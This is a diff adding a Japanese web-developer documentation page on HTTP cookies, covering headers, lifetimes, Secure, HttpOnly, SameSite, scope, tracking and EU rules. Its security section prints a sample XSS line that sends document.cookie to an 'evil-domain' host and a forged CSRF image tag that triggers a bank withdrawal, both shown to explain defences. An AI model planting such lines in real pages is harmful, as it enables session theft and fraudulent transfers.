@@ -1,0 +1,197 @@
+<div>{{HTTPSidebar}}</div>
+
+<p class="summary"><span class="seoSummary"><dfn>HTTP Cookie</dfn> (ウェブ Cookie、ブラウザー Cookie) は、サーバーがユーザーのウェブブラウザーに送信する小さなデータであり、ブラウザーに保存されて次のリクエストと共に同じサーバーへ返送されます。</span>一般的には、二つのリクエストが同じブラウザーから送信されたものであるかを知るために使用されます。例えば、ユーザーのログイン状態を維持することができます。Cookie は、<a href="/ja/docs/Web/HTTP/Overview#HTTP_is_stateless_but_not_sessionless">ステートレス</a>な HTTP プロトコルのためにステートフルな情報を記憶します。</p>
+
+<p>Cookie は主に、以下の 3 つの用途で使用されます。</p>
+
+<dl>
+ <dt>セッション管理</dt>
+ <dd>ログイン、ショッピングカート、ゲームのスコア、またはその他のサーバーが覚えておくべきもの</dd>
+ <dt>パーソナライゼーション</dt>
+ <dd>ユーザー設定、テーマ、その他の設定</dd>
+ <dt>トラッキング</dt>
+ <dd>ユーザーの行動の記録及び分析</dd>
+</dl>
+
+<p>Cookie は、クライアント側の汎用的な記憶領域として使用されたことがあります。これは他にクライアントへデータを保存する手段がなかった頃は合理的でしたが、現在では新しいストレージ API を採用することが推奨されます。Cookie はすべてのリクエストで送信されるので、 (特にモバイルデータ通信で) 効率を悪くする可能性があります。クライアントストレージ向けの新しい API として、<a href="/ja/docs/Web/API/Web_Storage_API" title="DOM Storage">Web storage API</a> (<code>localStorage</code> 及び <code>sessionStorage</code>) と <a href="/ja/docs/Web/API/IndexedDB_API">IndexedDB</a> があります。</p>
+
+<div class="note">
+<p>保存された Cookie (およびウェブページが使用できる他のストレージ) を確認するには、開発ツールの<a href="/ja/docs/Tools/Storage_Inspector">ストレージインスペクター</a>を有効化して、ストレージのツリーで Cookie を選択してください。</p>
+</div>
+
+<h2 id="Creating_cookies" name="Creating_cookies">Cookie の作成</h2>
+
+<p>HTTP リクエストを受け取った時、サーバーはレスポンスで {{HTTPHeader("Set-Cookie")}} ヘッダーを送信することができます。ふつう、Cookie はブラウザーに保存され、また Cookie は同じサーバーに対して行われるリクエストと共に、HTTP の {{HTTPHeader("Cookie")}} ヘッダーの中で送信されます。起源や期間を設定することができ、その後は Cookie が送信されなくなります。加えて、特定のドメインやパスへの制約が設定でき、Cookie をどこに送信するかを制限できます。</p>
+
+<h3 id="The_Set-Cookie_and_Cookie_headers" name="The_Set-Cookie_and_Cookie_headers"><code>Set-Cookie</code> ヘッダーと <code>Cookie</code> ヘッダー</h3>
+
+<p>HTTP の {{HTTPHeader("Set-Cookie")}} レスポンスヘッダーは、サーバーがユーザーエージェントへ Cookie を送信するために使用します。単純な Cookie は次のように設定されます。</p>
+
+<pre class="syntaxbox">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;</pre>
+
+<p>このヘッダーは、サーバーからクライアントへ Cookie を保存するよう指示します。</p>
+
+<div class="note"><strong>注記:</strong> 様々なサーバー側アプリケーションにおける <code>Set-Cookie</code> ヘッダーの使い方は次の通りです。
+
+<ul>
+ <li><a href="https://secure.php.net/manual/ja/function.setcookie.php">PHP</a></li>
+ <li><a href="https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value">Node.JS</a></li>
+ <li><a href="https://docs.python.org/3/library/http.cookies.html">Python</a></li>
+ <li><a href="https://api.rubyonrails.org/classes/ActionDispatch/Cookies.html">Ruby on Rails</a></li>
+</ul>
+</div>
+
+<pre>HTTP/2.0 200 OK
+Content-type: text/html
+Set-Cookie: yummy_cookie=choco
+Set-Cookie: tasty_cookie=strawberry
+
+[ページの内容]</pre>
+
+<p id="The_client_sends_back_to_the_server_its_cookies_previously_stored">そして、サーバーに対するすべての新たなリクエストで、ブラウザーは {{HTTPHeader("Cookie")}} ヘッダーを使用して、以前保存したすべての Cookie をサーバーへ送信します。</p>
+
+<pre>GET /sample_page.html HTTP/2.0
+Host: www.example.org
+Cookie: yummy_cookie=choco; tasty_cookie=strawberry</pre>
+
+<h3 id="Session_cookies" name="Session_cookies">セッション Cookie</h3>
+
+<p>上記で作成した Cookie は<em>セッション Cookie</em> です。<code>Expires</code> または <code>Max-Age</code> が指定されていないので、クライアントが終了したときに Cookie が削除されます。但し、ウェブブラウザーが<strong>セッション復元</strong>を使用すると、セッション Cookie の多くが、ブラウザーが閉じられなかったかのように持続的になることがあります。</p>
+
+<h3 id="Permanent_cookies" name="Permanent_cookies">持続的 Cookie</h3>
+
+<p><em>持続的 Cookie</em> は、クライアントを閉じるときに無効になるのではなく、指定した日時 (<code>Expires</code>) または指定した期間 (<code>Max-Age</code>) が経過した後に無効になります。</p>
+
+<pre>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</pre>
+
+<div class="note">
+<p><strong>注記</strong>: 期限日を設定した時、設定された日時はサーバーではなく、Cookie が設定されるクライアントの日時に関連します。</p>
+</div>
+
+<h3 id="Secure_and_HttpOnly_cookies" name="Secure_and_HttpOnly_cookies"><code>Secure</code> 及び <code>HttpOnly</code> Cookie</h3>
+
+<p>セキュア Cookie は、 HTTPS プロトコルを通じた暗号化されたリクエストでのみサーバーに送信されます。<code>Secure</code> とは言っても、本質的に安全ではなく、このフラグが本当の保護を提供できる訳ではないので、機密情報を Cookie に保存しては<em>いけません</em>。Chrome 52 及び Firefox 52 より、安全ではないサイト (<code>http:</code>) では <code>Secure</code> ディレクティブが付いた Cookie を設定できなくなっています。</p>
+
+<p>クロスサイトスクリプティング ({{Glossary("XSS")}}) 攻撃を防ぐため、<code>HttpOnly</code> の Cookie は、JavaScript の {{domxref("Document.cookie")}} API からアクセスすることができません。これらはサーバーにのみ送られます。例えば、サーバー側セッションを維持するための Cookie は JavaScript で利用する必要がないので、<code>HttpOnly</code> フラグを設定するべきです。</p>
+
+<pre>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</pre>
+
+<h3 id="Scope_of_cookies" name="Scope_of_cookies">Cookie のスコープ</h3>
+
+<p><code>Domain</code> 及び <code>Path</code> ディレクティブは、Cookie の<em>スコープ</em>、つまり Cookie を送信する対象の URL を定義します。</p>
+
+<p><code>Domain</code> は、Cookie を受信することができるホストを指定します。指定されていない場合は、既定で<a href="/ja/docs/Web/API/Document/location">現在の文書がある場所のホスト</a>になり、<strong>サブドメインは除外されます</strong>。<code>Domain</code> が指定された場合、サブドメインは常に含まれます。</p>
+
+<p>例えば、<code>Domain=mozilla.org</code> を設定すると、<code>developer.mozilla.org</code> のようなサブドメインも含まれます。</p>
+
+<p><code>Path</code> は、<code>Cookie</code> ヘッダーを送信するためにリクエストされた URL の中に含む必要がある URL のパスを示します。%x2F ("/") の文字はディレクトリ区切り文字として解釈され、サブディレクトリーにも同様に一致します。</p>
+
+<p>例えば、<code>Path=/docs</code> を設定すると、以下のパスに一致します。</p>
+
+<ul>
+ <li><code>/docs</code></li>
+ <li><code>/docs/Web/</code></li>
+ <li><code>/docs/Web/HTTP</code></li>
+</ul>
+
+<h3 id="SameSite_cookies_experimental_inline" name="SameSite_cookies_experimental_inline"><code>SameSite</code> Cookie {{experimental_inline}}</h3>
+
+<p><code>SameSite</code> Cookie は、クロスサイトリクエストと共に Cookie を送信してはならないことをサーバーが示せるようにします。これは、クロスサイトリクエストフォージェリ攻撃 ({{Glossary("CSRF")}}) の対策のひとつです。 <code>SameSite</code> Cookie はまだ実験的であり、対応していないブラウザーがあります。</p>
+
+<p>次に例を示します。</p>
+
+<pre>Set-Cookie: key=value; SameSite=strict</pre>
+
+<p>same-site 属性は二つの値のうち一つを取ることができます。</p>
+
+<dl>
+ <dt><code>strict</code></dt>
+ <dd>same-site Cookie がこの値を持っていた場合、ブラウザーはリクエストが Cookie を設定したウェブサイトに対しての場合のみ送信します。リクエストが現在の場所の URL とは異なる URL に対して行われる場合、 <code>strict</code> 属性でタグ付けされた Cookie は含まれません。</dd>
+ <dt><code>lax</code></dt>
+ <dd>この属性が lax に設定された場合、 same-site Cookie はドメイン間のサブリクエスト、つまり画像やフレームの読み込みのための呼び出しで保持されますが、ユーザーがリンクをたどった場合など、外部サイトの URL でも送信されます。</dd>
+</dl>
+
+<p>このフラグが設定されていなかったり、ブラウザーが対応していなかったりする場合は、オリジン間のリクエストを含め、あらゆるリクエストで Cookie が含まれます。、</p>
+
+<h3 id="JavaScript_access_using_Document.cookies" name="JavaScript_access_using_Document.cookies">Document.cookies を使用して JavaScript でアクセスする</h3>
+
+<p>{{domxref("Document.cookie")}} プロパティを使用して新しい Cookie を作成することもできます。また <code>HttpOnly</code> フラグが設定されていなければ、既存の Cookie に JavaScript からアクセスすることもできます。</p>
+
+<pre class="brush: js">document.cookie = "yummy_cookie=choco"; 
+document.cookie = "tasty_cookie=strawberry"; 
+console.log(document.cookie); 
+// "yummy_cookie=choco; tasty_cookie=strawberry" をログに記録</pre>
+
+<p>JavaScript で生成された Cookie は <code>HttpOnly</code> フラグを含むことができません。</p>
+
+<p>後述する<a href="/ja/docs/Web/HTTP/Cookies#Security">セキュリティ</a>の節に記載したとおり、セキュリティの影響に注意してください。JavaScript で使用できる Cookie は、XSS によって盗まれる可能性があります。</p>
+
+<h2 id="Security" name="Security">セキュリティ</h2>
+
+<div class="note">
+<p>HTTP Cookie は仕組み全体が本質的に安全ではないため、機密情報や重要な情報を保存したり転送したりしてはいけません。</p>
+</div>
+
+<h3 id="Session_hijacking_and_XSS" name="Session_hijacking_and_XSS">セッションハイジャックと XSS</h3>
+
+<p>Cookie は、ユーザーや認証セッションの識別を行うために、ウェブアプリケーションでよく使われており、Cookie が盗まれるとユーザーの認証済みセッションの乗っ取りにつながります。Cookie を盗む手口としては、ソーシャルエンジニアリングやアプリケーションの {{Glossary("XSS")}} 脆弱性の悪用がよくあります。</p>
+
+<pre class="brush: js">(new Image()).src = "http://www.evil-domain.com/steal-cookie?cookie=" + document.cookie;</pre>
+
+<p>Cookie の <code>HttpOnly</code> 属性を使用すると、JavaScript で Cookie の値にアクセスできなくため、これらの攻撃を緩和するのに役立ちます。</p>
+
+<h3 id="Cross-site_request_forgery_(CSRF)" name="Cross-site_request_forgery_(CSRF)">クロスサイトリクエストフォージェリ (CSRF)</h3>
+
+<p><a href="https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery">Wikipedia</a> で {{Glossary("CSRF")}} の的確な例を挙げています。この場面では、誰かが (例えばフィルタリングされていないチャットやフォーラムに) 画像として、本当は画像ではなく銀行のサーバーに対する資金の引き出し要求であるものを含めています。</p>
+
+<pre class="brush: html">&lt;img src="http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory"&gt;</pre>
+
+<p>ここで、もし銀行のアカウントにログイン中であり、Cookie がまだ有効である (また、他の検証が行われていない) 場合は、この画像を含む HTML を読み込むと、すぐに送金されてしまうでしょう。このようなことを防ぐために使われる方法がいくつかあります。</p>
+
+<ul>
+ <li>{{Glossary("XSS")}} と同様に、入力内容のフィルタリングが重要です。</li>
+ <li>注意が必要なアクションに対して、常に確認を必要とするべきです。</li>
+ <li>注意が必要なアクションで使用する Cookie は、有効期間を短くし、 sameSite 属性を <code>strict</code> に設定してください。 (上記の <a href="#SameSite_cookies">SameSite Cookie</a> を参照)</li>
+ <li>ほかの防御策については、<a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet">OWASP CSRF prevention cheat sheet</a> をご覧ください。</li>
+</ul>
+
+<h2 id="Tracking_and_privacy" name="Tracking_and_privacy">トラッキングとプライバシー</h2>
+
+<h3 id="Third-party_cookies" name="Third-party_cookies">サードパーティの Cookie</h3>
+
+<p>Cookie には、関連付けられたドメインが存在します。このドメインとページが存在するドメインが同じである Cookie は、<em>ファーストパーティ Cookie</em> と呼びます。ドメインが異なる場合は、<em>サードパーティ Cookie</em> と呼びます。ファーストパーティ Cookie は、Cookie を設定したサーバーにしか送信されませんが、ウェブページには他のドメインのサーバーに保存されている画像などの部品 (広告バナーなど) が含まれている場合があります。これらサードパーティの部品によって送信される Cookie は、サードパーティ Cookie と呼ばれ、主にウェブのいたるところで広告やトラッキングを行うために使われています。例として <a href="https://www.google.com/policies/technologies/types/">Google が使用している Cookie の種類</a>をご覧ください。ほとんどのブラウザーは既定でサードパーティ Cookie を許可していますが、それらを遮断できるアドオン (例えば <a href="https://www.eff.org/">EFF</a> による <a href="https://addons.mozilla.org/firefox/addon/privacy-badger17/">Privacy Badger</a>) があります。</p>
+
+<p>サードパーティ Cookie を明らかにしなければ、消費者は Cookie の使用が分かったときに害があるものだと考えるでしょう。(プライバシーポリシーなどで) 明確に開示することで、Cookie を見つけたときの悪影響を防止できるでしょう。また、Cookie に関する法令が存在する国もあります。例えば、ウィキメディア財団の <a href="https://meta.wikimedia.org/wiki/Cookie_statement/ja">Cookie に関する声明</a>をご覧ください。</p>
+
+<h3 id="Do-Not-Track" name="Do-Not-Track">Do-Not-Track</h3>
+
+<p>使用に関して法的あるいは技術的な要求はありませんが、ウェブアプリケーションに、アプリケーションのトラッキングやユーザー個人をサイト間でトラッキングすることを無効化すべきであると知らせるために {{HTTPHeader("DNT")}} ヘッダーを使用することができます。詳しくは {{HTTPHeader("DNT")}} ヘッダーをご覧ください。</p>
+
+<h3 id="EU_cookie_directive" name="EU_cookie_directive">EU Cookie 指令</h3>
+
+<p>EU における Cookie の要件が、欧州議会の <a href="http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136">Directive 2009/136/EC</a> で定義され、2011年5月25日に発効しました。指令そのものは法令ではありませんが、EU 加盟国への要求では、指令の要件に合致する適切な法令を施行するよう述べています。実際の法令は、国によって異なります。</p>
+
+<p>簡単に言うと EU 指令では、誰かがコンピューターや携帯電話などの機器に情報を保存したりデバイスから情報を取り出したりする前に、ユーザーは説明に基づいて同意を与えなければなりません。これ以降多くのウェブサイトが、Cookie を使用していることをユーザーに通知するバナー (別名「Cookie バナー」) を追加しました。</p>
+
+<p>詳しくは <a href="https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive">Wikipedia のこちらの章</a> をご覧いただき、最新かつ正確な情報を得るために各国の法令を確認してください。</p>
+
+<h3 id="Zombie_cookies_and_Evercookies" name="Zombie_cookies_and_Evercookies">ゾンビ Cookie とエバー Cookie</h3>
+
+<p>ゾンビ Cookie やエバー Cookie は、削除後に再作成をしたり、意図的に永久に削除することを困難にしたりする、より過激な Cookie への取り組みです。これは、<a href="/docs/Web/API/Web_Storage_API" title="DOM Storage">Web storage API</a> や Flash の Local Shared Objects 等の技術を使用して、 Cookie が存在しないことを検出したときに再作成するものです。</p>
+
+<ul>
+ <li><a href="https://github.com/samyk/evercookie">Evercookie by Samy Kamkar</a></li>
+ <li><a href="https://en.wikipedia.org/wiki/Zombie_cookie">Zombie cookies on Wikipedia</a></li>
+</ul>
+
+<h2 id="See_also" name="See_also">関連情報</h2>
+
+<ul>
+ <li>{{HTTPHeader("Set-Cookie")}}</li>
+ <li>{{HTTPHeader("Cookie")}}</li>
+ <li>{{domxref("Document.cookie")}}</li>
+ <li>{{domxref("Navigator.cookieEnabled")}}</li>
+ <li><a href="/ja/docs/Tools/Storage_Inspector">ストレージインスペクターを使った Cookie の調査</a></li>
+ <li><a class="external" href="https://tools.ietf.org/html/rfc6265">Cookie specification: RFC 6265</a></li>
+ <li><a href="https://en.wikipedia.org/wiki/HTTP_cookie">HTTP cookie on Wikipedia</a></li>
+</ul>
